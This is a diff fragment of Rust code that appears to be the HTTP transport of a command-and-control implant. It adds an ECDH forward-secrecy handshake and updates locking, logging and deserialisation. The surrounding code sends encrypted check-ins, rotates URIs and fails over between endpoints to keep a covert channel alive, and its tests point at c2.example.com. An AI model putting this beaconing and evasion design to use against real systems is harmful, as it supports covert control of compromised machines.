         let ciphertext = self.session.encrypt(&serialized);
 
         // Apply the client transform pipeline to the checkin payload.
@@ -1437,20 +1334,26 @@ impl Transport for HttpTransport {
 
         let req = req.body(body);
 
+        // Attach ECDH header if forward-secrecy handshake is still pending.
+        let req = match self.ecdh_header_value() {
+            Some(val) => req.header(common::forward_secrecy::ECDH_HEADER_NAME, val),
+            None => req,
+        };
+
         let result = self.connect_with_retry(req, "http_get").await;
         let resp = match result {
             Ok(resp) => {
                 // Record success for sticky session.
-                self.failover.lock().unwrap().record_success();
+                self.failover.lock_recover().record_success();
                 resp
             }
             Err(e) => {
                 // Record failure and advance to next endpoint.
                 let backoff = {
-                    let mut fo = self.failover.lock().unwrap();
+                    let mut fo = self.failover.lock_recover();
                     fo.record_failure_and_advance()
                 };
-                log::warn!(
+                tracing::warn!(
                     "recv failed on {}: {}. Backing off {:?}",
                     endpoint,
                     e,
@@ -1463,6 +1366,9 @@ impl Transport for HttpTransport {
 
         let resp_headers = resp.headers().clone();
         let bytes = resp.bytes().await?;
+
+        // Attempt ECDH session upgrade from server response.
+        self.try_ecdh_upgrade(&resp_headers);
 
         // Observe the inbound traffic for adaptive timing.
         #[cfg(feature = "adaptive-timing")]
@@ -1500,7 +1406,7 @@ impl Transport for HttpTransport {
             Err(e) => {
                 // Transform decode failure — increment failure counter.
                 let failures = self.consecutive_failures.fetch_add(1, Ordering::Relaxed) + 1;
-                log::warn!(
+                tracing::warn!(
                     "server transform decode failed (attempt {}): {}. Rotating URI.",
                     failures,
                     e
@@ -1518,7 +1424,7 @@ impl Transport for HttpTransport {
             Ok(p) => p,
             Err(e) => {
                 let failures = self.consecutive_failures.fetch_add(1, Ordering::Relaxed) + 1;
-                log::warn!(
+                tracing::warn!(
                     "session decrypt failed (attempt {}): {}. Rotating URI.",
                     failures,
                     e
@@ -1531,7 +1437,7 @@ impl Transport for HttpTransport {
             }
         };
 
-        let msg = bincode::deserialize(&plaintext)?;
+        let msg = bincode::serde::decode_from_slice(&plaintext, bincode::config::legacy()).map(|(v, _)| v)?;
         Ok(msg)
     }
 }
@@ -1778,6 +1684,7 @@ mod tests {
                 vec![],
                 "https://c2.example.com".to_string(),
             )),
+            ecdh_client: None,
             #[cfg(feature = "adaptive-timing")]
             adaptive_timer: None,
         };
@@ -1854,6 +1761,7 @@ mod tests {
                 vec![],
                 "https://c2.example.com".to_string(),
             )),
+            ecdh_client: None,
             #[cfg(feature = "adaptive-timing")]
             adaptive_timer: None,
         };
